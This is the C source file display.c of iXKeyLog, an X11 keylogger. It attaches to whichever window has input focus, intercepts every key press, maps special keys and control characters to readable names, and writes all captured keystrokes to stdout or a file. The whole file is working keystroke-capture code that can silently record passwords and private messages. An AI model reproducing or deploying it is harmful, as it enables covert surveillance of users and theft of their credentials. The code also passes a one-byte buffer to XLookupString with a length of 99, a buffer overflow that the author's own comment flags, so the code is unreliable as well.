/** 
 iXKeyLog - Copyright (c) 2011 by Victor Dorneanu
 All rights reserved. 
 
 display.c - The important stuff is done here.

 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions
 are met:
 1. Redistributions of source code must retain the above copyright
    notice, this list of conditions and the following disclaimer.
 2. Redistributions in binary form must reproduce the above copyright
    notice, this list of conditions and the following disclaimer in the
    documentation and/or other materials provided with the distribution.
 3. The name of the author may not be used to endorse or promote products
    derived from this software without specific prior written permission.

 THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include "ixkeylog.h"
#include "display.h"
#include "args.h"

/* Keycodes we'd like to catch */
char *keycodes[D_KEYCODES_LEN];

/* Control characters we'd like to catch */
char *control_chars[D_CONTROLCHARS_LEN];



/**
 * Initialize and fill in array <keycodes> with those key codes that 
 * have to be intercepted before being sent to output.
 * Have a look at file:display.h for more details.
 * 
 * 
 * @return No data is returned.
 */
static void display_init_keycodes()
{
    int i, array_len;
    
    /* Initialize keycode capture table */
    for (i = 0; i < D_KEYCODES_LEN -1; i++)
        keycodes[i] = NULL;
            
    /* Get table size */
    array_len = sizeof(keycodes_table) / sizeof(KEYCODEMAP);

    /* Fill in array with predefined values (see display.h) */
    for (i = 0; i < array_len; i++) {
        
        /*** DEBUG ****************************************************/
        if(g_ixkeylog_opts->debug > 0)
            M_DEBUG_INFO("Adding (%d, \"%s\") to <keycodes>\n",
                        keycodes_table[i].ks, keycodes_table[i].ksname);
        /**************************************************************/
        
        keycodes[(int)keycodes_table[i].ks] = keycodes_table[i].ksname;
    }
}


/**
 * We'll have to intercept some control characters like ^C, ^M etc. 
 * in order to have a nice output. 
 * Check out file:display.h for further information.
 * 
 * @return No data is returned.
 */
static void display_init_controlchars()
{
    int i,array_len;
    /* Initialize control chars caputure table */
    for (i = 0; i < D_CONTROLCHARS_LEN - 1; i++)
        control_chars[i] = NULL;
        
    array_len = sizeof(controlchars_table) / sizeof(CONTROLCHARMAP);
        
    /* Fill in array with predefined values */
    for (i = 0; i < array_len; i++) {
        
        /*** DEBUG ****************************************************/
        if(g_ixkeylog_opts->debug > 0)
            M_DEBUG_INFO("Adding (0x%x, \"%s\") to <controlchars>\n",
            controlchars_table[i].cchar, controlchars_table[i].name);
        /**************************************************************/
                        
        control_chars[(int)controlchars_table[i].cchar] = 
                      controlchars_table[i].name;
    }
}


/**
 * Initialize X11 logging session. 
 * Arguments are stored in <g_ixkeylog_opts> (ixkeylog.h)
 * 
 * @return Pointer to new X11LogSess instance
 */
X11LogSess *display_init() {
    X11LogSess *sess;
    FILE *fd;
    
    /* Create new instance */
    if (!(sess = malloc(sizeof(struct _X11LogSess)))) {
        M_DISPLAY_ERROR;
        return NULL;
    } else {
        /* Set display */
        if(!g_ixkeylog_opts->display)
            sess->dpy = XOpenDisplay(getenv("DISPLAY"));
        else
            sess->dpy = XOpenDisplay(g_ixkeylog_opts->display);
            
        /* Set focused window */
        sess->focuswin = None;
        
        // Open file descriptor for output
        if(!g_ixkeylog_opts->output)                        
            fd = stdout;
        else {
            // TODO: set permissions for created file
            if(!(fd = fopen(g_ixkeylog_opts->output, "w+"))) {
                M_DISPLAY_ERROR;
                return NULL;
            }
        }
        
        /* Set file descriptor */
        sess->fd = fd;
        
        /* Which keycodes / control characters should be intercepted
           before being sent to output?
         */
        display_init_keycodes();
        display_init_controlchars();

                
        /* Return new session */    
        return sess;
    }
}


/**
 * Handle events defined in <display_focus> 
 * 
 * @param sess Previously create X11LogSess session
 */
void display_handle_event(X11LogSess *sess) {
    XEvent ev;              /* X11 event object */
    KeyCode kc = -1;        /* Key Code */
    KeySym ks;              /* Key symbol */
    char *ksname = NULL;    /* String representation of ks */
    char buf;               /* FIXME: Is this secure? */
    int len = 0;
    
    XNextEvent(sess->dpy, &ev);
    
    if(ev.xany.type == FocusOut)
        sess->focuswin = None;
    else if (ev.xany.type == KeyPress) {
        /* XLookupString  handle keyboard input events in Latin-1 */
        len = XLookupString(&ev.xkey, &buf, 99, &ks, 0);
        
        /* Find out string representation */
        if(ks == NoSymbol) {
            ksname = "NoSymbol";
        } else {
            if (!(ksname = XKeysymToString (ks)))
            ksname = "(no name)";
            kc = XKeysymToKeycode(sess->dpy, ks);
        }
        
        
        /*** DEBUG ****************************************************/
        if(g_ixkeylog_opts->debug > 0) {
            M_DEBUG_INFO("keycode: %u (keysym 0x%lx, %s) buf: %c\n", 
                          kc, (unsigned long) ks, ksname, buf);
            
            /* If we're in Debug modus then we should return here since
               logged data doesn't have to be sent to output.
             */
            return;
        }
        /**************************************************************/
        
        
        /* Check if kc is in keycodes */
        if (keycodes[(int)kc]) {
            fprintf(sess->fd, "%s", keycodes[(int)kc]);
            fflush(sess->fd);
        }
        
        
        /* Check if <buf> is control character. If so, then check if it
           is in control_chars
         */
        if(iscntrl(buf)) {
            if(control_chars[(int)buf]) {
                fprintf(sess->fd, "%s", control_chars[(int)buf]);
                fflush(sess->fd);
                return;
            }
        }
                
        
        /* Send captured key to output */
        fprintf(sess->fd, "%c", buf);
        fflush(sess->fd);
    }
}


/**
 * Focus to new window  and get keyboard input 
 * 
 * @param sess Previously created logging session
 */
void display_focus(X11LogSess *sess) {
    int revert_to_return = 0;
    
    /**
     * If focus is None, all keyboard events are discarded until a new 
     * focus window is set, and the revert_to argument is ignored.
     * (source: XGetInputFocus(3))
     */
    XGetInputFocus(sess->dpy, &(sess->focuswin), &revert_to_return);
    
    
    if (sess->focuswin != None) {

        /**  
         *  The KeyPressMask tells the X server to process KeyPress 
         *  events. The FocusChangeMask will tell the X server to 
         *  look up for window change events (FocusIn, FocusOut).
         *  
         *  TODO: Specify window(s) to be focused
         */
        XSelectInput(sess->dpy, sess->focuswin, 
                     KeyPressMask | FocusChangeMask);
    } else
        sleep(1);
}


/**
 * Close connection to display and do cleanup stuff.
 *
 * @param sess Previosly created logging session
 * @return return value of XCloseDisplay
 */ 
int display_close(X11LogSess *sess) {
    int res;
    res = XCloseDisplay(sess->dpy), free(sess);
    
    return res;
}
